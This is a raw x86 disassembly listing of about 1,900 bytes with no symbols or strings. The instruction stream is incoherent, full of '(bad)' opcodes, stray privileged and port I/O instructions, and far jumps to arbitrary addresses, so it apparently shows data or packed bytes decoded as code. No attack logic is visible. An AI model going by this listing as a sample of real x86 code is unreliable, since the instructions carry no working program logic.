  4046bc:	addr16 jmp 0x8929a56
  4046c2:	(bad)  
  4046c3:	xchg   ebp,eax
  4046c4:	mov    al,ds:0xd6ced202
  4046c9:	inc    BYTE PTR [ebx]
  4046cb:	mov    esp,0xee593890
  4046d0:	jge    0x4046ca
  4046d2:	adc    eax,0xd01deafe
  4046d7:	cmp    DWORD PTR [esi+0x9c60d8a],0xffffffac
  4046de:	cmp    al,0x25
  4046e0:	mov    esp,0x80bfc607
  4046e5:	stos   BYTE PTR es:[edi],al
  4046e6:	dec    edx
  4046e7:	jne    0x4046dc
  4046e9:	mov    eax,edi
  4046eb:	sub    eax,DWORD PTR [ebp+0x4a]
  4046ee:	imul   eax,DWORD PTR [edi],0x7fbdf22c
  4046f4:	imul   ebp,DWORD PTR [eax-0x73017f17],0xffffffe8
  4046fb:	mov    BYTE PTR [ebp-0x19],al
  4046fe:	cmp    al,0x2d
  404700:	jne    0x404707
  404702:	sub    bl,ah
  404704:	std    
  404705:	mov    ch,0x7f
  404707:	or     DWORD PTR [esi+eiz*2-0x7e],edi
  40470b:	cmp    al,0x3a
  40470d:	jne    0x404719
  40470f:	cs hlt 
  404711:	and    bl,cl
  404713:	lods   al,BYTE PTR ds:[esi]
  404714:	jmp    0x4046f7
  404716:	inc    ebp
  404717:	sahf   
  404718:	in     eax,dx
  404719:	mov    al,0x12
  40471b:	loopne 0x4046d8
  40471d:	out    dx,eax
  40471e:	cmp    al,0x2e
  404720:	sub    al,BYTE PTR [esi-0x48]
  404723:	popa   
  404724:	outs   dx,DWORD PTR ds:[esi]
  404725:	ins    BYTE PTR es:[edi],dx
  404726:	mov    esp,0x7589dc2a
  40472b:	fsub   DWORD PTR [ecx]
  40472d:	retfw  0x8b5a
  404731:	inc    esi
  404732:	stos   BYTE PTR es:[edi],al
  404733:	(bad)  
  404735:	rcr    BYTE PTR [esi],1
  404737:	jae    0x404723
  404739:	fild   DWORD PTR [eax+0xa94e77d]
  40473f:	sub    edx,ecx
  404741:	jae    0x40474b
  404743:	shr    DWORD PTR [edi-0x5],1
  404746:	mov    al,0x3f
  404748:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40474a:	xchg   ecx,ebx
  40474c:	pop    ss
  40474d:	mov    al,0x20
  40474f:	rep stos BYTE PTR es:[edi],al
  404751:	sbb    esi,DWORD PTR [ebx]
  404753:	lahf   
  404754:	test   BYTE PTR [esi-0x16],cl
  404757:	cmp    DWORD PTR [ebp-0x10],0xffffff9e
  40475b:	push   edx
  40475c:	pop    ebp
  40475d:	gs (bad) 
  40475f:	mov    edi,0x5a94f6bd
  404764:	pop    ecx
  404765:	mov    ebx,DWORD PTR [ecx+ebp*8+0x3c88c912]
  40476c:	sub    dh,BYTE PTR [edx+eiz*1+0x3c]
  404770:	xor    BYTE PTR [edx+0x3d],dh
  404773:	cmp    al,0x39
  404775:	ja     0x4047b0
  404777:	imul   ebx,ebx,0x10ff839b
  40477d:	mov    al,ds:0xb60f302c
  404782:	rol    BYTE PTR [ecx],0xc3
  404785:	and    al,BYTE PTR [ebx]
  404787:	in     al,0x58
  404789:	mov    ebx,0x4f75686a
  40478e:	fimul  DWORD PTR [esi-0xed808e]
  404794:	push   cs
  404795:	add    al,0xa0
  404797:	jo     0x4047ce
  404799:	cld    
  40479a:	or     al,0x6c
  40479c:	retf   0x3fd2
  40479f:	sbb    BYTE PTR [esp+eiz*2-0x6cf78b3d],ch
  4047a6:	ret    
  4047a7:	and    al,0xdf
  4047a9:	mov    cl,al
  4047ab:	push   edi
  4047ac:	call   0x5d50:0x3af54e66
  4047b3:	pop    esp
  4047b4:	jne    0x4047c2
  4047b6:	lea    ebp,[ecx+0x1b]
  4047b9:	(bad)  
  4047ba:	div    BYTE PTR [esi+ebx*8]
  4047bd:	mov    eax,DWORD PTR [esi]
  4047bf:	call   0xf595:0x24ff0456
  4047c6:	jbe    0x404780
  4047c8:	xchg   BYTE PTR [edi+0x6],dh
  4047cb:	cmp    edi,esi
  4047cd:	jns    0x404769
  4047cf:	out    dx,eax
  4047d0:	mov    edi,0xef78860e
  4047d5:	addr16 inc edi
  4047d7:	js     0x404808
  4047d9:	jnp    0x404779
  4047db:	out    0xb1,al
  4047dd:	pop    es
  4047de:	add    BYTE PTR [eax+0x2b],bh
  4047e1:	or     dh,0x27
  4047e4:	cmp    al,0x30
  4047e6:	pushf  
  4047e7:	ja     0x4047f0
  4047e9:	push   ss
  4047ea:	push   eax
  4047eb:	in     al,dx
  4047ec:	xchg   BYTE PTR [eax-0x9],ch
  4047ef:	inc    ecx
  4047f0:	mov    ebx,0xca3e604a
  4047f5:	fsubr  DWORD PTR [ecx]
  4047f7:	shl    eax,1
  4047f9:	cld    
  4047fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047fb:	fwait
  4047fc:	adc    ah,BYTE PTR [edx+0x758d18bd]
  404802:	mov    bh,0x24
  404804:	fadd   QWORD PTR [ebx+0x72]
  404807:	sub    cl,0xa6
  40480a:	or     al,0x61
  40480c:	clc    
  40480d:	inc    esp
  40480e:	je     0x4bd33e6c
  404814:	imul   ebp,DWORD PTR [esi],0x1aaa2695
  40481a:	dec    edx
  40481b:	or     dl,BYTE PTR [ebp+0x3c]
  40481e:	push   ebx
  40481f:	call   0xa76a:0xb3ebf69d
  404826:	pop    esp
  404827:	outs   dx,BYTE PTR ds:[esi]
  404828:	adc    BYTE PTR [ebx+0x1b],ch
  40482b:	nop
  40482c:	add    esi,edx
  40482e:	mov    dh,0xf5
  404830:	test   al,0xf5
  404832:	call   0x2087:0xfe80301a
  404839:	addr16 xor eax,0xf53f980
  40483f:	test   DWORD PTR [eax-0x79],edi
  404842:	icebp  
  404843:	jl     0x404802
  404845:	iret   
  404846:	ret    
  404847:	sbb    eax,0xec706662
  40484c:	sbb    ebp,DWORD PTR [esi+0x78]
  40484f:	jbe    0x404860
  404851:	mov    edx,eax
  404853:	aad    0x70
  404855:	or     al,dh
  404857:	jmp    0x4048a3
  404859:	xor    ecx,ecx
  40485b:	inc    ecx
  40485c:	jmp    0xacac:0x41ceaa1b
  404863:	and    al,cl
  404865:	jmp    0x4048a4
  404867:	mov    esi,0xfb77cad4
  40486c:	inc    esi
  40486d:	mov    bl,ch
  40486f:	add    eax,0xc3f34be
  404874:	add    esi,DWORD PTR [ebp-0x4]
  404877:	aas    
  404878:	and    DWORD PTR [ebp-0x5],ebp
  40487b:	add    eax,0xfc427471
  404880:	call   esi
  404882:	pop    ebx
  404883:	js     0x404871
  404885:	mov    DWORD PTR [ebx+ecx*1+0x50],edi
  404889:	mov    bh,0xb4
  40488b:	jl     0x404904
  40488d:	add    eax,0xe66b280
  404892:	loop   0x4048f1
  404894:	mov    esp,0x77dc4d3b
  404899:	sbb    BYTE PTR [edx],cl
  40489b:	scas   eax,DWORD PTR es:[edi]
  40489c:	js     0x404848
  40489e:	xchg   ecx,eax
  40489f:	jb     0x40488a
  4048a1:	(bad)  
  4048a2:	mov    ah,BYTE PTR ds:[esi]
  4048a5:	jecxz  0x4048db
  4048a7:	scas   eax,DWORD PTR es:[edi]
  4048a8:	jmp    0x70f9:0x894f6907
  4048af:	pop    edi
  4048b0:	ds push eax
  4048b2:	leave  
  4048b3:	add    DWORD PTR [ebx],0x27
  4048b6:	loop   0x4048ad
  4048b8:	lods   eax,DWORD PTR ds:[esi]
  4048b9:	out    0xa3,al
  4048bb:	fnsave [ebp-0x77]
  4048be:	jmp    0x269002d
  4048c3:	mov    bh,0x0
  4048c5:	outs   dx,BYTE PTR ds:[esi]
  4048c6:	mov    bl,0xdf
  4048c8:	jl     0x4048c5
  4048ca:	inc    edx
  4048cb:	dec    edx
  4048cc:	inc    edi
  4048cd:	je     0x40490e
  4048cf:	mov    bl,0x1
  4048d1:	or     al,0x45
  4048d3:	je     0x40490d
  4048d5:	mov    bl,0x2
  4048d7:	inc    esi
  4048d8:	je     0x4048ec
  4048da:	mov    bl,0x3
  4048dc:	fcomp  QWORD PTR [edi+0x744e36f6]
  4048e2:	hlt    
  4048e3:	dec    ebp
  4048e4:	jl     0x404870
  4048e6:	mov    bl,0x4
  4048e8:	mov    eax,0xf7c17612
  4048ed:	sar    BYTE PTR [edi],0x58
  4048f0:	cmp    edx,eax
  4048f2:	jbe    0x404919
  4048f4:	mov    edx,0x1b7536b2
  4048f9:	xchg   esi,eax
  4048fa:	push   ss
  4048fb:	sbb    DWORD PTR [ebx+0x60],ebp
  4048fe:	adc    eax,0xdc648a80
  404903:	mov    edx,0x7f55890
  404908:	dec    esi
  404909:	cmp    eax,0x12
  40490c:	pop    esi
  40490d:	mov    eax,0xfb45350f
  404912:	jecxz  0x40495e
  404914:	push   eax
  404915:	loopne 0x4048ae
  404917:	mov    edx,esi
  404919:	inc    esp
  40491a:	iret   
  40491b:	dec    ecx
  40491c:	push   0xffffffd3
  40491e:	sbb    ebx,eax
  404920:	push   esi
  404921:	(bad)  
  404925:	ret    
  404926:	xor    ah,al
  404928:	and    eax,0xbab02ca
  40492d:	rcr    DWORD PTR [eax-0x34],cl
  404930:	lahf   
  404931:	ds test eax,ecx
  404934:	or     bl,dl
  404936:	push   edi
  404937:	or     al,0xef
  404939:	dec    eax
  40493a:	cli    
  40493b:	popa   
  40493c:	xor    BYTE PTR [edx+0x9],bh
  40493f:	shr    DWORD PTR [eax],1
  404941:	or     BYTE PTR [ecx+0x20097c0a],ah
  404947:	jno    0x404915
  404949:	or     al,0x5e
  40494b:	xor    eax,0x6e979cbc
  404950:	add    dl,bh
  404952:	(bad)  
  404953:	mov    al,gs:0x6659781e
  404959:	repnz bound esp,QWORD PTR [ebx+0x183b8564]
  404960:	xchg   BYTE PTR [eax+0x401e2211],bl
  404966:	(bad)  
  404967:	das    
  404968:	push   ecx
  404969:	adc    al,0x87
  40496b:	shl    DWORD PTR [ecx-0x71d365fd],1
  404971:	imul   edi,DWORD PTR [eax-0x23],0x17c44640
  404978:	aad    0x4f
  40497a:	jne    0x404933
  40497c:	xor    BYTE PTR [esp+eiz*2+0x183dc7fa],dl
  404983:	jns    0x4049e6
  404985:	pcmpgtb mm7,QWORD PTR [ebp+0x28]
  404989:	sbb    eax,0x564df8ee
  40498e:	inc    ebx
  40498f:	mov    dh,0x9b
  404991:	mov    al,bh
  404993:	out    dx,eax
  404994:	js     0x40499d
  404996:	scas   eax,DWORD PTR es:[edi]
  404997:	mov    al,0xe
  404999:	ret    
  40499a:	(bad)  
  40499b:	push   ss
  40499c:	or     al,0x4f
  40499e:	jl     0x4049ab
  4049a0:	mov    bh,bh
  4049a2:	cmp    bl,0x30
  4049a5:	dec    eax
  4049a6:	cmp    edi,eax
  4049a8:	jl     0x4049f0
  4049aa:	jmp    0x4049de
  4049ac:	add    ebx,ebx
  4049ae:	mov    ebx,0xa1cb0080
  4049b3:	(bad)  
  4049b4:	mov    ch,0x9d
  4049b6:	and    dh,bl
  4049b8:	outs   dx,DWORD PTR ds:[esi]
  4049b9:	imul   esi,DWORD PTR [ecx+0x7d759106],0xffffffc7
  4049c0:	pop    esi
  4049c1:	xlat   BYTE PTR ds:[ebx]
  4049c2:	je     0x404986
  4049c4:	jae    0x404a05
  4049c6:	or     DWORD PTR [edi],0xffffff8d
  4049c9:	xchg   ebp,eax
  4049ca:	fldenv [eax]
  4049cc:	iret   
  4049cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049ce:	pop    edi
  4049cf:	add    al,0xf0
  4049d1:	rol    DWORD PTR [eax-0x59],cl
  4049d4:	push   esi
  4049d5:	xor    esi,esi
  4049d7:	stos   BYTE PTR es:[edi],al
  4049d8:	or     BYTE PTR [edi],ch
  4049da:	inc    eax
  4049db:	and    DWORD PTR [esi+edx*4+0x22],esp
  4049df:	or     al,BYTE PTR [edi*2+0xb2db006]
  4049e6:	hlt    
  4049e7:	push   edi
  4049e8:	std    
  4049e9:	neg    edx
  4049eb:	jmp    0x4049f3
  4049ed:	or     ah,ah
  4049ef:	jo     0x404979
  4049f1:	loopne 0x40499d
  4049f3:	xchg   edx,eax
  4049f4:	push   eax
  4049f5:	mov    ebx,esp
  4049f7:	out    0xb6,al
  4049f9:	push   0x1902f40
  4049fe:	or     al,0xec
  404a00:	mov    BYTE PTR [ebx],dl
  404a02:	inc    ebx
  404a03:	dec    ecx
  404a04:	test   eax,0xe0bfff85
  404a09:	in     eax,dx
  404a0a:	or     ecx,ecx
  404a0c:	jg     0x4049f7
  404a0e:	dec    ebx
  404a0f:	mov    al,BYTE PTR [ebx]
  404a11:	stos   BYTE PTR es:[edi],al
  404a12:	cmp    ebx,esp
  404a14:	jne    0x404a0e
  404a16:	pop    eax
  404a17:	pop    esi
  404a18:	aas    
  404a19:	pusha  
  404a1a:	mov    cl,0xe0
  404a1c:	adc    esp,0x7fa032e2
  404a22:	xchg   esp,eax
  404a23:	jb     0x404a60
  404a25:	jg     0x404a3e
  404a27:	inc    edx
  404a28:	sti    
  404a29:	mov    al,ds:0xa1fa0f7e
  404a2e:	js     0x404a5e
  404a30:	hlt    
  404a31:	mov    al,ds:0x78a0177c
  404a36:	stc    
  404a37:	repz mov al,ds:0x7cc7f27d
  404a3d:	ins    DWORD PTR es:[edi],dx
  404a3e:	lods   al,BYTE PTR ds:[esi]
  404a3f:	pop    eax
  404a40:	cld    
  404a41:	mov    ds:0x75000b13,eax
  404a46:	pop    ss
  404a47:	es out dx,al
  404a49:	add    bh,BYTE PTR [ebp+0x7e]
  404a4c:	pushf  
  404a4d:	ret    
  404a4e:	inc    ebp
  404a4f:	add    BYTE PTR [ebx],0x7e
  404a52:	add    eax,0x4d7e895b
  404a57:	je     0x404a85
  404a59:	push   esp
  404a5a:	adc    al,0x27
  404a5c:	pushf  
  404a5d:	adc    BYTE PTR [edx],al
  404a5f:	jb     0x404a64
  404a61:	std    
  404a62:	fistp  WORD PTR [eax+0xc]
  404a65:	fdivr  st(2),st
  404a67:	cs ins DWORD PTR es:[edi],dx
  404a69:	pop    eax
  404a6a:	mov    edi,DWORD PTR [ebp-0x4]
  404a6d:	movzx  esi,WORD PTR [ebx+0x7c]
  404a71:	pop    es
  404a72:	stos   DWORD PTR es:[edi],eax
  404a73:	push   ss
  404a74:	sub    eax,0x1a737422
  404a79:	xor    al,0x2e
  404a7b:	xchg   esi,eax
  404a7c:	(bad)  
  404a7d:	dec    esi
  404a7e:	jmp    FWORD PTR [ebx-0x7d]
  404a81:	lea    esi,[ecx+ecx*2-0x13dc8488]
  404a88:	mov    ecx,0x1d1da69b
  404a8d:	pop    ebp
  404a8e:	outs   dx,BYTE PTR ds:[esi]
  404a8f:	sub    eax,0x5d84d764
  404a94:	adc    dh,bh
  404a96:	pop    ss
  404a97:	ins    DWORD PTR es:[edi],dx
  404a98:	in     eax,dx
  404a99:	fild   WORD PTR [ecx]
  404a9b:	je     0x404aa5
  404a9d:	add    al,0x77
  404a9f:	or     DWORD PTR [edi],ecx
  404aa1:	mov    edi,0x7eb43b70
  404aa6:	add    dh,BYTE PTR [edx-0x73]
  404aa9:	sbb    al,0x9d
  404aab:	psubb  mm7,QWORD PTR [edx]
  404aae:	mov    edx,0x9e5d5d64
  404ab3:	sbb    ecx,DWORD PTR [eax]
  404ab5:	call   ebx
  404ab7:	lock cld 
  404ab9:	repnz mov ebp,0xe91c08af
  404abf:	enter  0x9151,0x34
  404ac3:	in     eax,dx
  404ac4:	push   es
  404ac5:	and    al,0x7c
  404ac7:	cli    
  404ac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ac9:	push   DWORD PTR [ebx]
  404acb:	mov    cs,WORD PTR [ecx+0x4e]
  404ace:	inc    esi
  404acf:	dec    esi
  404ad0:	inc    ecx
  404ad1:	dec    esi
  404ad2:	lods   al,BYTE PTR ds:[esi]
  404ad3:	or     BYTE PTR [edx+0x41b74e30],al
  404ad9:	sub    DWORD PTR [ebp+0x3e],ebp
  404adc:	jge    0x404ab4
  404ade:	push   eax
  404adf:	jo     0x404a8b
  404ae1:	ret    
  404ae2:	std    
  404ae3:	clc    
  404ae4:	aaa    
  404ae5:	sbb    DWORD PTR [esi+0x68d44db4],esi
  404aeb:	mov    esp,0x831d7f0c
  404af0:	stc    
  404af1:	std    
  404af2:	jl     0x404b0c
  404af4:	ret    
  404af5:	arpl   WORD PTR cs:[ebx+0x5a],di
  404af9:	sbb    cl,BYTE PTR [edx+ebp*4-0x80]
  404afd:	sbb    bh,BYTE PTR [edx]
  404aff:	mov    dh,BYTE PTR [eax]
  404b01:	std    
  404b02:	jnp    0x404af9
  404b04:	jbe    0x404ab0
  404b06:	neg    ecx
  404b08:	sbb    dh,bl
  404b0a:	stos   BYTE PTR es:[edi],al
  404b0b:	jmp    0x404b27
  404b0d:	jmp    0x404b51
  404b0f:	mov    dh,BYTE PTR [edi+edx*1-0x56]
  404b13:	loop   0x404b0d
  404b15:	loopne 0x404b71
  404b17:	neg    ebp
  404b19:	movlps QWORD PTR [eax-0x5499bf3c],xmm1
  404b20:	pop    ss
  404b21:	pop    es
  404b22:	inc    edx
  404b23:	clc    
  404b24:	dec    edi
  404b25:	cs stos DWORD PTR es:[edi],eax
  404b27:	test   BYTE PTR [edx],bh
  404b29:	sub    al,0x4
  404b2b:	les    ebx,FWORD PTR [esi]
  404b2d:	mov    bh,0x9
  404b2f:	cli    
  404b30:	pop    esi
  404b31:	and    esi,ebp
  404b33:	jp     0x404abf
  404b35:	gs inc esi
  404b37:	jo     0x404b82
  404b39:	sbb    esi,DWORD PTR [esi-0x4c]
  404b3c:	sub    ebp,DWORD PTR [edi]
  404b3e:	clc    
  404b3f:	scas   eax,DWORD PTR es:[edi]
  404b40:	ss cmp dl,dh
  404b43:	add    al,0xfc
  404b45:	leave  
  404b46:	mov    al,0x45
  404b48:	mov    bl,BYTE PTR [ebp-0x2a]
  404b4b:	mov    edi,0xbe4ad455
  404b50:	cdq    
  404b51:	mov    dl,0x4e
  404b53:	pop    ebx
  404b54:	inc    eax
  404b55:	ins    DWORD PTR es:[edi],dx
  404b56:	in     al,0x3c
  404b58:	cli    
  404b59:	adc    dh,BYTE PTR [edx+0x5]
  404b5c:	mov    edx,0x1c0c0e7c
  404b61:	mov    ds:0xeb05263f,eax
  404b66:	sub    bl,BYTE PTR [edi-0xb]
  404b69:	or     eax,0x74ae020f
  404b6e:	or     cl,BYTE PTR [ecx-0x9a3b738]
  404b74:	repz mov bl,ah
  404b77:	inc    ebx
  404b78:	or     edx,DWORD PTR [eax+esi*8+0x67]
  404b7c:	test   eax,0x4b0f7449
  404b81:	jne    0x404b77
  404b83:	sbb    bh,dl
  404b85:	cmp    al,0xed
  404b87:	stos   BYTE PTR es:[edi],al
  404b88:	mul    DWORD PTR [edi-0x14cb93e3]
  404b8e:	call   0xfb5e67a3
  404b93:	add    DWORD PTR [edx-0x3287f61d],ebp
  404b99:	push   ss
  404b9a:	loope  0x404b99
  404b9c:	dec    edx
  404b9d:	je     0x404bab
  404b9f:	inc    ecx
  404ba0:	jne    0x404b9b
  404ba2:	pop    ebp
  404ba3:	pop    esp
  404ba4:	test   ebx,0x9bf3f294
  404baa:	mov    bh,0xf
  404bac:	pavgw  mm4,QWORD PTR [ecx]
  404baf:	or     BYTE PTR [edx],bl
  404bb1:	repnz mov ecx,0xcb38040f
  404bb7:	jge    0x404bb1
  404bb9:	stos   BYTE PTR es:[edi],al
  404bba:	add    eax,0xbccb882e
  404bbf:	lea    ebx,[ebx+ebx*4-0x4630830f]
  404bc6:	mov    al,0xea
  404bc8:	sbb    eax,0x3c7e4007
  404bcd:	inc    eax
  404bce:	je     0x404bee
  404bd0:	inc    esi
  404bd1:	cmp    al,0x24
  404bd3:	xchg   DWORD PTR [edx],edx
  404bd5:	je     0x404c17
  404bd7:	(bad)  
  404bd8:	or     BYTE PTR [edx],0x18
  404bdb:	cs ins BYTE PTR es:[edi],dx
  404bdd:	add    DWORD PTR [esi],esi
  404bdf:	jne    0x404b8b
  404be1:	fiadd  WORD PTR [edx]
  404be3:	or     eax,0xe243f825
  404be8:	xor    al,0xe2
  404bea:	adc    al,0xa0
  404bec:	pusha  
  404bed:	push   esi
  404bee:	mov    ecx,DWORD PTR [eax]
  404bf0:	test   DWORD PTR [esi+0x5],ebx
  404bf3:	jl     0x404bd4
  404bf5:	jbe    0x404b7e
  404bf7:	mov    edx,ss
  404bf9:	and    al,0x2a
  404bfb:	inc    eax
  404bfc:	add    BYTE PTR [edx],ch
  404bfe:	and    al,0x8
  404c00:	and    al,0x20
  404c02:	adc    al,0x2a
  404c04:	and    BYTE PTR [esi+0x28f6eedd],bh
  404c0a:	sub    BYTE PTR [ecx],ch
  404c0c:	inc    eax
  404c0d:	sub    eax,0x92d2433
  404c12:	sub    ch,BYTE PTR ds:0x75242a26
  404c18:	scas   eax,DWORD PTR es:[edi]
  404c19:	xor    esi,DWORD PTR [edi+0x51]
  404c1c:	sbb    cl,BYTE PTR [ecx]
  404c1e:	and    al,0x26
  404c20:	sub    eax,0x9d9e2d5b
  404c25:	jae    0x404bf6
  404c27:	outs   dx,DWORD PTR ds:[esi]
  404c28:	adc    BYTE PTR ds:0xe640981,ch
  404c2e:	xor    BYTE PTR [eax],ch
  404c30:	dec    esp
  404c31:	xchg   esp,eax
  404c32:	jmp    0x404cb1
  404c34:	sub    DWORD PTR [eax],ebp
  404c36:	xor    ch,BYTE PTR [ecx]
  404c38:	and    DWORD PTR [edi+0xb002ee0],0xcda058e8
  404c42:	sub    ebp,DWORD PTR [eax-0x5e]
  404c45:	add    BYTE PTR [edi+0x74],cl
  404c48:	inc    esp
  404c49:	outs   dx,BYTE PTR ds:[esi]
  404c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c4b:	outs   dx,DWORD PTR ds:[esi]
  404c4c:	(bad)  ds:0x127bbe5d
  404c52:	ins    DWORD PTR es:[edi],dx
  404c53:	test   DWORD PTR [esi-0x6a],esp
  404c56:	mov    edx,eax
  404c58:	and    eax,0x1815dfa5
  404c5d:	adc    DWORD PTR [ebp+edi*1+0x6622750d],esp
  404c64:	test   DWORD PTR [esi+0x6],0x51a5f4af
  404c6b:	sbb    dl,BYTE PTR [ecx]
  404c6d:	mov    ah,0x9
  404c6f:	cmp    DWORD PTR [esi+0x37],0xc33fa203
  404c76:	mov    es,WORD PTR [eax+0x32]
  404c79:	mov    BYTE PTR [ebx+0x46],0x6a
  404c7d:	outs   dx,BYTE PTR ds:[esi]
  404c7e:	mov    bl,bl
  404c80:	cs je  0x404cba
  404c83:	rcr    BYTE PTR cs:[ebx+0x10c0693f],1
  404c8a:	dec    ebp
  404c8b:	mov    al,ds:0x84010f8
  404c90:	add    bl,BYTE PTR [ebp+eax*4+0x23]
  404c94:	out    0xee,eax
  404c96:	fabs   
  404c98:	push   ebx
  404c99:	mov    ebx,0x7e8fabfe
  404c9e:	sbb    eax,0xfcd95b38
  404ca3:	rcr    bl,cl
  404ca5:	scas   eax,DWORD PTR es:[edi]
  404ca6:	pop    esp
  404ca7:	or     al,bl
  404ca9:	fstp   DWORD PTR [ebx-0x64098223]
  404caf:	call   esi
  404cb1:	jmp    0x4100:0xf645b6df
  404cb8:	je     0x404cc3
  404cba:	fidiv  DWORD PTR [edi-0x20a300cd]
  404cc0:	jne    0x404caa
  404cc2:	lea    edi,[ebx+0x3]
  404cc5:	mov    edx,0x8effc709
  404cca:	jg     0x404d44
  404ccc:	fwait
  404ccd:	mov    al,BYTE PTR [edx+ebp*1-0x19]
  404cd1:	nop
  404cd2:	shr    al,0x4
  404cd5:	and    ah,0xf
  404cd8:	add    ax,0x3030
  404cdc:	push   esi
  404cdd:	jmp    0x404c96
  404cdf:	pop    ebp
  404ce0:	or     bh,BYTE PTR [edx]
  404ce2:	mov    eax,es
  404ce4:	stos   BYTE PTR es:[edi],al
  404ce5:	mov    al,bh
  404ce7:	add    edi,DWORD PTR [ebp+0x8]
  404cea:	jns    0x404cf3
  404cec:	jg     0x404d29
  404cee:	jge    0x404d5b
  404cf0:	adc    DWORD PTR [ebp-0x50],ebp
  404cf3:	cmp    edi,DWORD PTR [ebp+0xc]
  404cf6:	pushf  
  404cf7:	or     BYTE PTR [ebx+0x277312ff],al
  404cfd:	cmp    BYTE PTR [edi+edi*2+0x77],0xdf
  404d02:	(bad)  
  404d03:	cmp    eax,DWORD PTR [ebx]
  404d05:	xor    eax,0x44c62572
  404d0a:	or     al,0x0
  404d0c:	dec    edi
  404d0d:	js     0x404d1c
  404d0f:	dec    BYTE PTR [esi]
  404d11:	and    eax,0xebed7739
  404d16:	pop    ds
  404d17:	data16 (bad) 
  404d19:	outs   dx,BYTE PTR ds:[esi]
  404d1a:	push   es
  404d1b:	ja     0x404d22
  404d1d:	pusha  
  404d1e:	xor    ecx,ecx
  404d20:	jmp    0x404d36
  404d22:	mov    edi,0xfb19493b
  404d27:	add    BYTE PTR [ebx],cl
  404d29:	out    dx,al
  404d2a:	inc    ecx
  404d2b:	xor    BYTE PTR [ecx+esi*8-0xa],dh
  404d2f:	push   esi
  404d30:	or     BYTE PTR [eax],dl
  404d32:	shr    dx,0xda
  404d36:	mov    ?,eax
  404d38:	jne    0x404d91
  404d3a:	mov    DWORD PTR [eax+0x53],ebp
  404d3d:	add    al,bl
  404d3f:	xchg   esp,eax
  404d40:	out    dx,al
  404d41:	fisub  DWORD PTR [ecx+eax*4-0x40]
  404d45:	(bad)  
  404d46:	xchg   ebp,eax
  404d47:	mov    dh,0x1e
  404d49:	adc    BYTE PTR [edi],ah
  404d4b:	loopne 0x404d05
  404d4d:	scas   eax,DWORD PTR es:[edi]
  404d4e:	fisub  DWORD PTR [ebx+0x93e0456]
  404d54:	ror    DWORD PTR [edi],1
  404d56:	test   BYTE PTR [edi+0xc40982c],dh
  404d5c:	mov    ebp,0xf7ce0e4b
  404d61:	fadd   DWORD PTR [ebx+0x40bc98da]
  404d67:	and    al,0xbd
  404d69:	or     BYTE PTR [eax],cl
  404d6b:	or     edi,edi
  404d6d:	jge    0x404d9d
  404d6f:	adc    al,0x4
  404d71:	jl     0x404d92
  404d73:	mov    edi,0x3b7ffef9
  404d78:	push   ebx
  404d79:	inc    ecx
  404d7a:	sub    eax,0xda81a77c
  404d7f:	mov    bl,0xb6
  404d81:	loopne 0x404d90
  404d83:	jae    0x404d77
  404d85:	dec    ecx
  404d86:	add    eax,0x6a09d21b
  404d8b:	mov    edi,0x89e04641
  404d90:	push   ebp
  404d91:	in     al,0xdf
  404d93:	ins    DWORD PTR es:[edi],dx
  404d94:	or     bh,dl
  404d96:	(bad)  
  404d97:	aas    
  404d98:	adc    al,0xc3
  404d9a:	in     eax,0x5a
  404d9c:	or     bh,BYTE PTR [edx+ebx*8]
  404d9f:	mov    ah,0x87
  404da1:	xchg   edi,eax
  404da2:	jle    0x404d5c
  404da4:	jo     0x404d5e
  404da6:	push   0xbc9b0f06
  404dab:	jne    0x404dc8
  404dad:	mov    ecx,0x1c02fa19
  404db2:	imul   edx,DWORD PTR [esi],0x9c1e7529
  404db8:	and    al,0xf
  404dba:	jne    0x404ddb
  404dbc:	dec    ecx
  404dbd:	pop    ebp
  404dbe:	bound  esp,QWORD PTR [edx+0x39eb28ef]
  404dc4:	mov    al,cl
  404dc6:	add    al,0x7c
  404dc8:	aas    
  404dc9:	and    al,ah
  404dcb:	(bad)  
  404dcd:	into   
  404dce:	inc    ecx
  404dcf:	or     al,0x42
  404dd1:	jmp    0x2903:0x134c8d00
  404dd8:	enter  0x7c6,0xb0
  404ddc:	pusha  
  404ddd:	push   eax
  404dde:	mov    al,0xce
  404de0:	cmp    BYTE PTR [edi],0xc6
  404de3:	div    DWORD PTR [esi-0x44]
  404de6:	pop    ds
  404de7:	jmp    0x404e54
  404de9:	and    DWORD PTR [ecx-0x77498b20],0xcb27cf1a
  404df3:	add    edi,0x4f445844
  404df9:	push   es
  404dfa:	in     al,dx
  404dfb:	dec    eax
  404dfc:	(bad)  
  404dfd:	jmp    0x404e56
  404dff:	pmuludq mm4,mm2
  404e02:	aaa    
  404e03:	cld    
  404e04:	mov    ebx,ecx
  404e06:	f2xm1  
  404e09:	fclex  
  404e0c:	fldcw  WORD PTR ds:0xeed9566c
  404e12:	jmp    0x84f04264
  404e17:	cmp    ecx,DWORD PTR [edx+0x2bff803e]
  404e1d:	lods   al,BYTE PTR ds:[esi]
  404e1e:	or     BYTE PTR ds:0xb7460175,ch
  404e24:	dec    edi
  404e25:	push   0x4670c107
  404e2a:	cmp    ah,BYTE PTR fs:[eax+0x75]
  404e2e:	or     BYTE PTR [esi-0x9],al
  404e31:	outs   dx,DWORD PTR ds:[esi]
  404e32:	outs   dx,DWORD PTR ds:[esi]
  404e33:	js     0x404e52
  404e35:	cmp    al,0x39
  404e37:	icebp  
  404e38:	je     0x404e89
  404e3a:	and    al,0x24
  404e3c:	fistp  QWORD PTR [eax*2+0x52460a75]
  404e43:	sub    DWORD PTR [esi],eax
  404e45:	clc    
  404e46:	xlat   BYTE PTR ds:[ebx]
  404e47:	jnp    0x404eab
  404e49:	pop    eax
  404e4a:	add    edx,eax
  404e4c:	jg     0x404de6
  404e4e:	jne    0x404e83
  404e50:	mov    eax,edx
  404e52:	sahf   
  404e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e54:	ret    
  404e55:	or     al,0x1
  404e57:	add    al,0x44
  404e59:	push   edi
  404e5a:	push   edx
  404e5b:	jg     0x404dee
  404e5d:	frstor [ebx+0x30e0d902]
  404e63:	adc    BYTE PTR [edi+ebx*8],al
  404e66:	aas    
  404e67:	jmp    0x404e6b
  404e69:	fstp   TBYTE PTR [edi]
  404e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e6c:	mov    ch,0x0
